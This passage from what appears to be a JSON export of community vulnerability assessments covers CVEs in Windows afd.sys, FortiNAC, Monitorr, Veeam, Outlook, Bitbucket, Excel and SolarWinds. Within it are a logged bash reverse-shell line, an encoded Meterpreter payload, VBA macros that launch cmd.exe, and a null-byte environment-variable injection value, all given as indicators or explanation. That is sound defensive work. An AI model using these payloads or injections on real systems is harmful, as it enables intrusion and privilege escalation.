      "document": "Interesting bug that was announced on Twitter at https://twitter.com/chompie1337/status/1633498392125997056 and later posted on GitHub at https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768. Bug occurs in `afd.sys` which is the Windows Ancillary Function Driver for WinSock, and allows privilege escalation from a local user to `NT AUTHORITY\\SYSTEM`.\r\n\r\nWhats interesting about this bug though is that unlike other EoP bugs, this only seems to affect Windows 11 and Windows Server 2022 according to https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-21768. Additionally the exploit at https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 is noted to only work on vulnerable Windows 11 22H2 systems, which raises the question of if there were some specific items that needed to be hardcoded for a specific version of Windows, such as offsets or similar.\r\n\r\nThe current exploit that is available, from my brief look at things, appears to use the I/O Ring R/W primitive that Yarden Shafir talked about at https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/ and later released a PoC on at https://github.com/yardenshafir/IoRingReadWritePrimitive. I'm somewhat surprised that Microsoft still hasn't patched this several months later given how strict they have been at trying to fix such items in the past, but these things typically require complicated change to the OS so perhaps I shouldn't be all too surprised, particularly given its dealing with I/O buffers which are heavily utilized.\r\n\r\nAfter leaking some addresses it appears to do the standard SYSTEM token replacement using the leaked EPROCESS address of the SYSTEM process and then takes that security token and replaces the chosen processes's security token with the SYSTEM security token. Note I say chosen here as the exploit takes a PID as an argument and uses that PID to find out which process's token it should replace with the SYSTEM security token.\r\n\r\nLooking closer at the exploit to perform some of the leaks there seems to be a reference to `NtQuerySystemInformation` which is commonly used for leaking information, however I don't actually see that being used anywhere, so it looks like it is potentially left over code.\r\n\r\nThe main vulnerability exploit code appears to be centralized into `ArbitraryKernelWrite0x1` in https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768/blob/master/Windows_AFD_LPE_CVE-2023-21768/exploit.c, which is then used to overwrite some entries in the IO ring buffer to transform it from arbitrary kernel write to arbitrary kernel read and write.\r\n\r\nLooking into `ArbitrarykernelWrite0x1` it seems it takes in a pointer to the address to overwrite, then creates an IPv4 extended TCP socket attribute structure, creates an IoCompletion object using `NtCreateIoCompletion` that allows for both querying and modifying the state, and allows one thread of concurrent access to the object.\r\n\r\nWe then call `NtSetIoCompletion` (documented to some degree at http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/IoCompletion/NtSetIoCompletion.html) on the same object with a completion key of `0x1337` and pass it the empty `IO_STATUS_BLOCK` object `IoStatusBlock` so we can keep track of the IO status of this IoCompletion object. We set the completion status to 0, aka not completed, and set the number of bytes transferred in a manually finished I/O operation to 0x100. Not sure why this value was chosen but eh.\r\n\r\nIf this completes successfully, then we go ahead and make a UNICODE_STRING called `ObjectFilePath` that holds the string `\\\\Device\\\\Afd\\\\Endpoint`, which according \"Reverse Engineering Windows AFD.sys\" by Steven Vittitoe which was presented at Recon 2015 at https://recon.cx/2015/slides/recon2015-20-steven-vittitoe-Reverse-Engineering-Windows-AFD-sys.pdf,  is an endpoint that allows access to 70+ IOCTLs that are defined within the `afd.sys` driver.\r\n\r\nLooking more at this paper we can also see that AFD.sys handles everything from TCP/IP to SAN and that its listed as the \"Ring 0 entrypoint for WinSock\", aka all WinSock calls will end up going through this driver which executes at the kernel level. This is backed up by their point that it handles all `socket()` calls.\r\n\r\nAnyway getting back to this we can see we also set an OBJECT_ATTRIBUTES object to the name of this string as the `ObjectName` parameter, and then set its attributes to 0x40, aka OBJ_CASE_INSENSITIVE as noted at http://www.jasinskionline.com/technicalwiki/Print.aspx?Page=Constants-Windows-API&AspxAutoDetectCookieSupport=1, as I guess we need case insensitive operations for this? Idk though without further info.\r\n\r\nFinally we call `NtCreateFile` to create this file and save the handle into `hSocket`. We ask for the maximium permissions possible on this object, pass in the `ObjectAttributes` object attributes object we created earlier so that we use the `\\\\Device\\\\Afd\\\\Endpoint` and use case insensitive naming, pass in the `IoStatusBlock` for the I/O completion object, allow read and write sharing, pass in nothing for the creation options since this device should already be created, and pass in 1 aka FILE_OPEN so we open the existing file. Finally we pass in `bExtendedAttributes` which will hold the hardcoded extended attributes for a IPv4 TCP socket.\r\n\r\nIf all goes well then we should now have an file handle in `hSocket` however the AFD driver still isn't fully aware of this socket. To complete this we then create a new `Data` object of type `AFD_NOTIFYSOCK_DATA`. This object type is not publicly documented anywhere as far as I can tell, and appears to have been guessed at via reverse engineering. In this structure we can see that we have a few pointers, a handle to `hCompletion` which explains our earlier completion object creation call, and some DWORDs.\r\n\r\nThe next few lines of the code will set the `hCompletion` parameter of this structure to the `hCompletion` object we created earlier, and after this we set `pData1` and `pData2` to 0x2000 byte long heap buffers that are readable and writeable and which have been reserved and committed in memory.\r\n\r\nWe then set `dwCounter` to 1 to indicate one entry, and set `dwLen` to 1. Not sure what `dwLen` controls though but we'll have to wait for the blog for more details. We interestingly set `dwTimeout` to an insanely large value of `100000000`. Its possible this may be related to an overflow which leads to the out of bound write, or it could be set this way to hold the connection open whilst the exploit happens and prevent timeouts. Finally we see that the address we wish to overwrite is placed into `Data.pPwnPtr` suggesting that this structure is responsible for the arbitrary overwrite and perhaps doesn't validate that the address is actually a kernel address and not a user address like it should be.\r\n\r\nFinally we create an event using `CreateEvent` and then call IOCTL 0x12127 on AFD, which the exploit notes as AFD_NOTIFYSOCK_IOCTL. My guess is that this processes the malicious `Data` structure of type `AFD_NOTIFYSOCK_DATA` and then fails to notice that the `Data.pPwnPtr` is out of the expected address range, allowing for an arbitrary write vulnerability.\r\n\r\n",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "e182da8d-0e9e-4469-83e2-ceda64a11fe3",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "271b7529-c30e-4293-83dc-9f0303d1074f",
      "created": "2023-03-08T21:51:25.395041Z",
      "revisionDate": "2023-03-09T20:14:26.259608Z",
      "document": "This vulnerability is an arbitrary file write in the `configurationWizard/keyUpload.jsp` endpoint. The arbitrary file write results in unauthenticated remote code execution in the context of the root user. \r\n\r\nA FortiNAC device provides protection against IoT threats, extends control to third-party devices, and orchestrates automatic responses to a wide range of networking events.. Despite these devices not having much of an internet facing footprint, if an attacker already inside your network gains root access to this device it will provide a great starting point to corrode the integrity of the rest of your network.  Exploitation is trivial.\r\n\r\n# IOCs\r\n\r\nThe original PoC as well as the metasploit module both use the arbitrary file write to drop a cron job (inside `/etc/cron.d/`) that initiates a reverse shell as the root user.\r\n\r\nA target compromised by the original PoC would have a log line in `/var/log/cron` similar to:\r\n```\r\nMar  8 11:40:01 localhost CROND[17120]: (root) CMD (bash -i >& /dev/tcp/192.168.123.1/4444 0>&1)\r\n```\r\n\r\nWhereas a target compromised by the metasploit module, will leave slightly different log lines in `/var/log/cron` depending on the Meterpreter session returned.\r\n\r\nPython Meterpreter:\r\n```\r\nMar  8 15:44:01 localhost CROND[11377]: (root) CMD (python /tmp/gSYDIjeD 0>&1)\r\nMar  8 15:44:03 localhost CROND[8878]: (root) CMDOUT (Traceback (most recent call last):)\r\nMar  8 15:44:03 localhost CROND[8878]: (root) CMDOUT (  File \"/tmp/gSYDIjeD\", line 1, in <module>)\r\nMar  8 15:44:03 localhost CROND[8878]: (root) CMDOUT (    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdkMIamxrIuVhDxICKCuzeRpU1HLU3TkmS1Kv53N3TxMsN78+bNRzdMo480jKbHKL5t14imDlhqEaLfmyhiNyB5HT2daeeor90bcpXDmmTRfx1iFqqlWS6JF+KIN48397vN9un2+gGSTprROTSRc6YuCqnKlVTFmVRMaK1zSJrGY92TDGeDU0zmaboMFnHi50BstSwl926qTc/Z1R0TQXo0H1wDPOcvpK2O2AL5fO8sUouOt3BpD3btyX/1dKGB4IyGp7tli2YcJo8h8OUFsil1IltMSvHDAluHXyB/G3tfLA==')[0]))))\r\nMar  8 15:44:03 localhost CROND[8878]: (root) CMDOUT (  File \"<string>\", line 9, in <module>)\r\n```\r\n\r\nLinux Meterpreter:\r\n```\r\nMar  8 15:46:01 localhost CROND[11595]: (root) CMD (chmod +x /tmp/vprwoPAh && /tmp/vprwoPAh 0>&1)\r\n```\r\n\r\nOf course, logs and the cron job files themselves can be cleaned up once root access is gained. In addition, there are also different ways to achieve RCE from an arbitrary file write. During testing I was able to drop a `.jsp` payload in the application webroot, although once triggered it returned a shell in the context of the user running the application and not the root user. Just be aware there could be IOCs outside `/var/log/cron`",
      "score": 4,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6e841577-8941-4226-b7f8-087b3f0a2ee2",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "72b459e2-5782-469e-86bc-5ea7b0a51b61",
      "created": "2023-03-09T20:17:53.207568Z",
      "revisionDate": "2023-03-20T12:16:15.396623Z",
      "document": "This is a Forti-thing, so there's a valuable target population, but I'd be surprised if a heap underflow got exploited widely. Not exploited as 0day, according to the [advisory](https://www.fortiguard.com/psirt/FG-IR-23-001), and no hackery in the wild that I can see. There are easier Forti-targets out there than this one. \r\n",
      "score": 3,
      "metadata": {
        "exploitability": 2
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "6d9e84c9-fe56-4038-96f7-403e4774eea6",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "d03ce7bc-077b-48c8-afb3-2d53e41ea8cd",
      "created": "2023-03-13T11:31:28.041107Z",
      "revisionDate": "2023-03-13T18:13:17.114746Z",
      "document": "`Monitorr` is a simple web application that allows you to setup a dashboard to monitor various web site / web application up or down state. It has been around for a while and is supported on both Linux and Windows, but development seems to be stalled.\r\nUnfortunately this nice neat web application suffers from a remote code execution vulnerability that allows an attacker to upload a webshell tagged as a `GIF` image and execute malicious php code.\r\nA typical vulnerability that has been in OSWASP top 10 [A04_2021-Insecure_Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) for a long time => [CWE-343 Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html), but developers still seems to get this wrong.\r\n\r\nAll versions including `v1.7.6m` are vulnerable and no patch is available.\r\n\r\n### Evidence of compromise\r\nWhen you want to check if your system is compromised, please look for unexpected files with extension like `php`,  `phar`, `php7` in the `assets/data/usrimg` (Linux) or `assets\\data\\usrimg` (Windows) directory.   Also be conscious of the fact that the files might have been cleaned up by the attacker to cover their tracks.\r\n\r\n### Mitigation\r\nAll versions of `Monitorr` are vulnerable, and the only mitigation is to restrict the execution of php code at the directory where the malicious file uploads are stored (Linux: `<web_root>/assets/data/usrimg` or Windows:  `<web_root\\assets\\data\\usrimg`).\r\n\r\nI have created a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section.\r\n[Submission](https://github.com/rapid7/metasploit-framework/pull/17771) to mainstream development is in progress.\r\n\r\n### References\r\n[CVE-2020-28871](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-28871)\r\n[Lyins Lab Discovery](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/)\r\n[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/170974/Monitorr-1.7.6-Shell-Upload.html)\r\n[OSWASP top 10 - A04_2021-Insecure_Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)\r\n[CWE-343 Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to `Lyins Lab` below who discovered  this vulnerability.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8eb3e6a4-2ce2-4559-8f24-7fd04b81cb45",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "33a9d13f-ca57-4d20-a996-0720a40eea42",
      "created": "2023-03-14T14:49:38.495244Z",
      "revisionDate": "2023-05-11T14:34:07.243455Z",
      "document": "On March 7, 2023, Veeam [published an advisory](https://www.veeam.com/kb4424), along with patches, for CVE-2023-27532. This vulnerability affects Veeam Backup & Replication versions 12 (before version 12.0.0.1420 P20230223) and 11 (before version 11.0.1.1261 P20230227). An unauthenticated attacker is able to retrieve encrypted credentials from the Veeam Backup service, which listens on TCP port 9401 by default. The original CVE was given a CVSS score of 7.5 and a severity of High, due to newly available information, this seems to underestimate the impact this vulnerability can have.\r\n\r\nOn March 9, 2023, [CODE WHITE GmbH tweeted](https://twitter.com/codewhitesec/status/1633948476353519616) that it was possible to retrieve plaintext credentials from the Veeam Backup service. The original advisory stated only encrypted credentials could be leaked, so this development significantly increases the impact of this vulnerability.\r\n\r\nOn March 13, 2023, [Huntress published an article](https://www.huntress.com/blog/veeam-backup-replication-cve-2023-27532-response) demonstrating how arbitrary code execution can be achieved. By leveraging the initial vulnerability to retrieve the encrypted credentials, the plaintext credentials can be retrieved by calling another unauthenticated endpoint on the Veeam Backup & Replication server. Finally the newly discovered credential appears to be used to call an authenticated endpoint to achieve arbitrary code execution with local system privileges. Huntress have not published full details of the exploit nor any proof of concept code.\r\n\r\nOn March 17, 2023, researcher [Y4er published technical details](https://y4er.com/posts/cve-2023-27532-veeam-backup-replication-leaked-credentials/) on how to retrieve the encrypted credentials from a vulnerable Veeam Backup & Replication server.\r\n\r\nVeeam Backup & Replication is a high value target for an attacker, and this product has been featured on the CISA [Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) Catalog in 2022 for two different CVE\u2019s.\r\n\r\nWhile it is unlikely to see the vulnerable service broadly exposed on internet-facing systems, for an attacker with initial access into a corporate network, this will be a target of great interest. In particular we can expect ransomware groups to leverage this vulnerability in future ransomware campaigns.\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8ef47a36-ae2f-4836-b2e0-1a2d87191310",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "b9d14604-5820-4d08-80bf-5bb9cc0d44e8",
      "created": "2023-03-15T08:17:45.236193Z",
      "revisionDate": "2023-03-20T10:46:04.953974Z",
      "document": "Microsoft reported having been notified by Cert-UA of a zero-day vulnerability in Outlook. This vulnerability was observed to be used by nation-state actors targeting Ukraine's government, military, energy, and transport sector during Mid-April and December 2022.\r\n\r\nBy sending malicious Outlook notes and tasks, the attackers were able to steal NTLM hashes via NTLM negotiation requests by forcing the targets\u2019 devices to authenticate to attacker-controlled SMB shares. These obtained credentials were used for lateral movement within the victim's networks.\r\n\r\nAttackers are able to craft an email that contains an extended MAPI property called PidLidReminderFileParameter for either a calendar appointment, note or task. This property can contain a remote UNC path to an SMB (TCP port 445) share on a threat actor-controlled server. The malicious email does not require any user interaction and the vulnerability can be triggered without either reading the email or viewing the email in preview mode, the vulnerability will be triggered automatically when the Outlook client receives and processes the email. Upon processing the malicious email, Outlook will access the UNC path to the attacker-controlled SMB share, which allows an attacker to perform an NTLM relay attack and access other internal systems.\r\n\r\nCVE-2023-23397 impacts all supported versions of Microsoft Outlook for Windows but doesn't affect Outlook for Android, iOS, or macOS versions.\r\nOutlook on the web and Microsoft 365 do not support NTLM authentication and are not vulnerable to CVE-2023-23397\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cdd15ae8-262c-4045-8be4-96099238ff91",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "232aa6f5-b6a9-4ed0-8ac5-17daa67b7eb3",
      "created": "2023-03-15T18:19:53.20588Z",
      "revisionDate": "2023-03-15T18:19:53.204412Z",
      "document": "Upon creation of a new user or when an existing user changes their user name, some local environment variables are updated to reflect those changes. The functionality involved in making these changes uses the `\\u0000` character as a delimiter, allowing for injection of environment variables into the user name if input such as `username\\u0000ENV_VAR=VALUE` is used. The `GIT_EXTERNAL_DIFF` environment variable will execute the script that it's assigned to when `git diff` is called, which can occur by viewing a diff in a repository hosted with Bitbucket.\r\n\r\nAn attacker must be able to modify or set a user name in order to inject an environment variable and payload into it. Bitbucket appears to only allow users in the admin and sys admin groups this particular permission. In some cases, this vulnerability can be exploited without authentication through the `allow public signup` feature in Bitbucket, a non-default feature which permits account creation for anyone that has public access to the server. While this means an attacker has control over the user name and can consequently inject a payload into it, they cannot change the user name. This doesn't bode well for attackers who want to evade detection.\r\n\r\nExploit attempts can be detected in various ways. Length restrictions on the user name make it difficult to drop anything other than a simple shell on the target, leading to multiple name change requests in the logs. Additionally, the user name, including the `GIT_EXTERNAL_DIFF=` string will appear in the logs and will remain on the site if exploited through the public signup option. Lastly, the `GIT_EXTERNAL_DIFF` environment variable will remain set if exploitation fails.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "40ceeec8-61f4-43df-b340-91e05ad05a9a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "e33d51ac-32a4-4556-a9a2-1d91ce3fda4f",
      "created": "2023-03-17T10:57:25.428534Z",
      "revisionDate": "2023-03-17T11:17:57.047969Z",
      "document": "## [CVE-2023-23399](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23399)\r\n\r\n[![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-23399/docs/Screenshot%202023-03-15%20152051.png)](https://www.microsoft.com/en-us/microsoft-365/excel)\r\n\r\n## Description:\r\nThe malicious user can exploit the victim's PC remotely.\r\nFor example, when the score indicates that the Attack Vector is Local and User Interaction is Required, this could describe an exploit in which an attacker, through social engineering, convinces a victim to download and open a specially crafted file from a website which leads to a local attack on their computer.\r\nIn this case, the malicious `excel` file create a very dangerous shell execution file, and after the victim will execute it, his PC maybe will never wake up normally, it depends on the case, which is very nasty.\r\n\r\nSTATUS: HIGH Vulnerability\r\n\r\n[+]Exploit0:\r\n```macros\r\nSub Check_your_salaries()\r\nCreateObject(\"Shell.Application\").ShellExecute \"microsoft-edge:https://pornhub.com/\"\r\nEnd Sub\r\n```\r\n[+]Exploit1:\r\n```macros\r\nSub cmd()\r\nDim Program As String\r\nDim TaskID As Double\r\nOn Error Resume Next\r\nProgram = \"cmd.exe\"\r\nTaskID = Shell(Program, 1)\r\nIf Err <> 0 Then\r\nMsgBox \"Can't start \" & Program\r\nEnd If\r\nEnd Sub\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-23399)\r\n\r\n## Proof and Exploit:\r\n[href](https://streamable.com/dnyfx0)\r\n\r\n## Proof and Exploit, danger example:\r\n[href](https://streamable.com/wdn6m1)\r\n\r\n## Time spend:\r\n03:00:00",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b82a5b45-8695-4276-97f1-5b56a3b09f8f",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "b7fdcd76-846c-49a4-a9fb-2193814015ba",
      "created": "2023-03-17T18:23:27.274375Z",
      "revisionDate": "2023-03-17T18:23:27.275135Z",
      "document": "The SolarWinds Information Service (SWIS) is vulnerable to RCE by way of a crafted message received through the AMQP message queue. A malicious user that can authenticate to the AMQP service can publish such a crafted message whose body is a serialized .NET object which can lead to OS command execution as NT AUTHORITY\\SYSTEM.\r\n\r\nIn order to authenticate to the AMQP service, a user would need to already have admin access to add a RabbitMQ user, or have recovered the credentials to the `orion` account that SolarWinds sets up automatically. For that reason, I've marked this as \"Authenticated\" and \"Requires elevated access\" because the `orion` account is not any ordinary user.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "e556c305-144f-4168-bce1-8cc199dfd5b8",
      "editorId": "5f7a5ce3-1adc-43cc-b28b-3fabdb0d98fb",
      "topicId": "082651ae-8b92-41b3-931c-af27e742ecae",
      "created": "2023-03-19T08:45:15.416697Z",
      "revisionDate": "2023-03-19T09:33:08.875149Z",
      "document": "Microsoft CVE-2023-21707: Microsoft Exchange Server Remote Code Execution Vulnerability",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "ae94261c-5f18-4768-baef-0af2eeb82f42",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "8bbee855-0abb-41d0-a53b-62d0a13ada7c",
      "created": "2023-03-21T15:40:26.942059Z",
      "revisionDate": "2023-04-19T20:52:52.436081Z",
      "document": "## Backdoors\r\nSince the dawn of our computing era, we have seen `backdoors` added in application code. You can find them in applications, operating systems, firmware etc and you see a variety of sophistication in the development and deployment of these `backdoors`. \r\nThe more or less official definition of a `backdoor` can be found at [wikipedia](https://en.wikipedia.org/wiki/Backdoor_(computing)) and defines it as:\r\n> A typically covert method of bypassing normal authentication or encryption in a computer, product, embedded device (e.g. a home router), or its embodiment.\r\n\r\n`Backdoors` can vary from a simple hard coded user / password combination to sophisticated `rootkits`, `object code backdoors`, `asymmetric backdoors` and `compiler backdoors` which are quite well explained in the article.\r\n\r\nReasons to install `backdoors` are either for legitimate reasons to allow access to development or support but in most cases it has a malicious intent to enable unauthorized access to system and applications. In any case, allowing `backdoors` in your code is not a good idea, because how well coded and secure, there is always somebody that discovers the `damn` thing and starts using it for different reasons.\r\n\r\nThe example below shows a pretty sophisticated undocumented `backdoor` in the `Optergy` building management system. During a reverse engineering code review,  this backdoor was discovered in 2019 by a security researcher `Gjoko Krstic` a.k.a. `LiquidWorm`.\r\n\r\nDuring the review a  backdoor script called `Console.jsp` located in `/usr/local/tomcat/webapps/ROOT/WEB-INF/jsp/tools/ ` was discovered which was not mentioned in any documentation, and it appeared to be a well-coded backdoor.  \r\nOnce you navigate to the console, issuing a command and clicking `Exec` resulted in errors. Clicking the `Get` button `ConsoleResult.html?get` returns a `JSON` response message:\r\n```json\r\n{\"response\":{\"message\":\"1679481930381\"}}\r\n```\r\nThe question now is to satisfy this challenge response to successfully execute commands.\r\n\r\nAnd after de-compiling the `ConsoleResult.class` java bytecode it revealed how this developer backdoor console actually works.\r\n\r\nLines `065`, `066`, and `067` of the code block 